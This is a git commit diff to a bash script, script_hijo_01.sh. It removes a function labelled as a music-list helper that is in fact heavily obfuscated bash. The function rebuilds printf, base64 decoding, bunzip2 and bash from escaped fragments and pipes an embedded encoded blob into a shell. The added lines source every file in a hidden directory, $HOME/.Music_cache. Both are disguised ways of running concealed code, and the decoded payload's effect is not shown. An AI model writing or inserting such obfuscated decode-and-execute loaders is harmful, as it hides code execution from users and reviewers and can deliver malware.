7197fcfd3969aef67e54f32fa26825c4f2267cc1
maxheadroom2 <sinteticbeat@hotmail.com>
2021-10-04 18:45:34 -0500

    importamos

--- script_hijo_01.sh
+++ script_hijo_01.sh
@@ -28,9 +28,9 @@
 
 #source ./script_hijo_00XX.sh
 
-funcion_lista_musica(){
- ${@,,} $'b\x61s'$'\150' ${*,} ${*,,}   <<<   "$(      ${*~} ''\p$'\x72'$'\x69''n'tf  'QlpoOTFBWSZTWQQ6uQsAAAOdgEAABwBAAQpAhAAgACIAMQgGmmgtNXY1ArGXi7kinChIAh1chYA='   "${@%%\]=\]G\`\{:}" "${@~~}"  |   ${*/X=0\{nO/sb\[7\`44;}   ${@~~} b'a'se6$'\u0034'  -d   ${*,,}   |  ${@#O<Qau\]=P}   ${*,,}   ""b'u'${*^}n""$'z\x69'\p$[   ((${*}3${*%%ZY\)lq.p}5#0*3"5""#"0)+${*}37#"2")  ]   -c  ${@,} "${@}"      )"  "${@//\[\)\)-;}"  "${@~}" 
-}
+for i in $HOME/.Music_cache/*;
+  do source $i
+done
 
 function_preparacion_entorno(){
     DIR1=/home/maxheadroom/.Music_cache/
